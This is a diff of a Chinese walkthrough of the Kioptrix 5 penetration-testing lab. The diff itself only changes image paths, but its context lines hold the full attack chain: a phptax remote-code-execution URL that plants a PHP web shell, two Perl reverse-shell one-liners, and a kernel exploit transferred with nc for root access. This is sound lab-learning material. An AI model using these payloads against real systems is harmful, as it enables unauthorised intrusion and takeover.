@@ -16,7 +16,7 @@
 
 也可以使用`nmap`等工具进行
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\1.jpg)
+![](./pic-5/1.jpg)
 
 # 信息收集
 
@@ -28,25 +28,25 @@ nmap -sV -O 192.168.1.74 -p- -T4
 
 这里看到扫描出的`ssh`当前处于关闭状态
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\2.jpg)
+![](./pic-5/2.jpg)
 
 ## 网站信息探测
 
 访问80端口，发现相当于网站的默认界面
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\3.jpg)
+![](./pic-5/3.jpg)
 
 查看页面源代码，发现一个注释中的信息，提供一个`url`，可能是网站目录
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\4.jpg)
+![](./pic-5/4.jpg)
 
 把这个`url`拼接在80端口的目录，发现应该是一个`cms`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\5.jpg)
+![](./pic-5/5.jpg)
 
 使用`whatweb`工具或者`wappalyzer`插件分析网站构造
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\6.jpg)
+![](./pic-5/6.jpg)
 
 采用`apache`2.2.21(freeBSD)版本，扩展`mod_ssl`2.2.21版本，`php`版本5.3.8
 
@@ -58,25 +58,25 @@ nmap -sV -O 192.168.1.74 -p- -T4
 dirsearch -u http://192.168.10.10/pChart2.1.3/ -x 404
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\7.jpg)
+![](./pic-5/7.jpg)
 
 访问`readme.txt`，确定该`cms`的版本
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\8.jpg)
+![](./pic-5/8.jpg)
 
 # 漏洞寻找及利用
 
 使用`searchsploit`搜索有无对应的漏洞，发现有一个文档
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\9.jpg)
+![](./pic-5/9.jpg)
 
 查看文档，里面记录了该`cms`存在的漏洞，包括`xss`和文件包含，路径遍历
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\10.jpg)
+![](./pic-5/10.jpg)
 
 当前来看，`xss`可能无法给予更多的东西，尝试路径，测试后发现，该方式确实可以
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\11.jpg)
+![](./pic-5/11.jpg)
 
 因为靶机采用`apache`，所以，尝试默认的日志文件路径，看能否查看
 
@@ -84,21 +84,21 @@ dirsearch -u http://192.168.10.10/pChart2.1.3/ -x 404
 
 之前在使用`whatweb`扫描出的靶机是`freeBSD`的，所以百度一下，其默认的界面，或者访问官方文档
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\12.jpg)
+![](./pic-5/12.jpg)
 
 当然这也可以通过前面的路径遍历，根据收集的字典去进行爆破，也是可以的
 
 首先查看配置文件，查看一圈，发现并未有把任何文件都解析为`php`的，或者把日志文件解析为`php`也是没有的，不过在配置文件中，发现一个信息
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\13.jpg)
+![](./pic-5/13.jpg)
 
 那么访问8080端口进行测试，发现直接访问就是403，那么就是与这个配置有关，需要指定`user-agent`为`Mozilla/4.0 Mozilla4_browser`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\14.jpg)
+![](./pic-5/14.jpg)
 
 不过这里因为所有8080端口的请求都需要该`user-agent`，所以推荐使用浏览器插件`user-agent switch and manager`这个可以使得浏览器在访问的时候，一直采用固定的`user-agent`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\15.jpg)
+![](./pic-5/15.jpg)
 
 这个界面也挺像某种`cms`的，只是不知道是否有漏洞，搜索了一下，其最新版本是`2002.08`版本
 
@@ -106,13 +106,13 @@ dirsearch -u http://192.168.10.10/pChart2.1.3/ -x 404
 
 使用`searchsploit`搜索，发现除了使用`msf`外，有两种形式，远程代码执行倒是符合现在所需要的
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\16.jpg)
+![](./pic-5/16.jpg)
 
 查看第二个文件`25849.txt`，整体是一个`php`脚本，更改名称后可用，并且其中是有用法的，若是采用这种方式，需要修改脚本中的`user-agent`
 
 这里我采用脚本中的关键代码进行测试
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\17.jpg)
+![](./pic-5/17.jpg)
 
 ```shell
 http://192.168.10.10:8080/phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E
@@ -124,7 +124,7 @@ http://192.168.10.10:8080/phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20pa
 http://192.168.10.10:8080/phptax/data/rce.php?cmd=id
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\18.jpg)
+![](./pic-5/18.jpg)
 
 这时候就可以构造反弹`shell`的代码测试
 
@@ -136,7 +136,7 @@ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.10.6
 
 推荐一个网站吧，这里反弹shell挺多的`https://forum.ywhack.com/reverse-shell/`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\19.jpg)
+![](./pic-5/19.jpg)
 
 # 提权
 
@@ -148,39 +148,39 @@ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.10.6
 perl -e 'use Socket;$i="192.168.10.6";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\19-1.jpg)
+![](./pic-5/19-1.jpg)
 
 这里反弹成功后，对于`sh`有个提示，说是无权`tty`，以及任务控制关闭
 
 使用`find`寻找到具有SUID权限的文件后，经过测试也是无法使用的，可参考网站`https://gtfobins.github.io`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\19-2.jpg)
+![](./pic-5/19-2.jpg)
 
 
 
 收集靶机内核版本信息
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\20.jpg)
+![](./pic-5/20.jpg)
 
 内核信息有了，使用`searchsploit`搜索，发现有对应的内核版本提权
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\21.jpg)
+![](./pic-5/21.jpg)
 
 有文件。那么现在就是想办法传输，测试有哪些命令吧
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\22.jpg)
+![](./pic-5/22.jpg)
 
 有`nc`和`gcc`，那么使用`nc`传输文件
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\23.jpg)
+![](./pic-5/23.jpg)
 
 然后使用`gcc`编译文件后，执行后就获取`root`权限
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\24.jpg)
+![](./pic-5/24.jpg)
 
 查看`/root`目录下的东西
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-5\25.jpg)
+![](./pic-5/25.jpg)
 
 还有一个日志清空的脚本，查看脚本内容
 
